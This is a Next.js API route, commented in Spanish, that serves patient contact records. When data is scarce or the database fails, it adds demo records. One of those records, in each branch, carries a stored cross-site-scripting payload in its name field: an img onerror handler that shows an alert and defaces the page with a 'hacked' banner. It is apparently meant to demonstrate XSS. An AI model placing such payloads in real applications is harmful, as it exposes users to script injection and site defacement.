// app/api/patients/route.ts
import { NextResponse } from 'next/server'
import pool from '../../../lib/db'

export async function GET() {
  try {
    // Consultar la base de datos real
    const result = await pool.query(`
      SELECT 
        id,
        name,
        email,
        message,
        timestamp,
        source
      FROM contacts 
      ORDER BY timestamp DESC
    `)

    // Si no hay datos reales, incluir datos de prueba con XSS para la demo
    let patients = result.rows

    // Agregar el payload XSS para la demo si no hay suficientes datos
    if (patients.length < 2) {
      const demoPatients = [
        {
          id: 999,
          name: "Juan Pérez (Demo)",
          email: "demo@email.com",
          message: "Consulta de prueba",
          timestamp: new Date().toISOString(),
          source: "demo"
        },
        {
          id: 998,
          name: "<img src='x' onerror='alert(\"XSS ejecutado!\"); document.body.style.background=\"red\"; document.body.innerHTML=\"<h1 style=color:white;text-align:center;margin-top:200px>SITIO HACKEADO VÍA N8N</h1>\";'>Atacante",
          email: "atacante@evil.com",
          message: "Payload XSS para demostración",
          timestamp: new Date().toISOString(),
          source: "xss-demo"
        }
      ]
      
      patients = [...patients, ...demoPatients]
    }

    return NextResponse.json(patients)

  } catch (error) {
    console.error('Error conectando a la base de datos:', error)
    
    // Fallback: devolver datos simulados si hay error de conexión
    const fallbackPatients = [
      {
        id: 1,
        name: "Juan Pérez (Fallback)",
        email: "juan@email.com",
        message: "Error de conexión - datos simulados",
        timestamp: "2025-09-27T10:30:00Z",
        source: "fallback"
      },
      {
        id: 2,
        name: "<img src='x' onerror='alert(\"XSS ejecutado!\"); document.body.style.background=\"red\"; document.body.innerHTML=\"<h1 style=color:white;text-align:center;margin-top:200px>SITIO HACKEADO VÍA N8N</h1>\";'>María González",
        email: "atacante@evil.com",
        message: "Payload XSS de demostración",
        timestamp: "2025-09-27T14:15:00Z",
        source: "xss-demo"
      }
    ]

    return NextResponse.json(fallbackPatients)
  }
}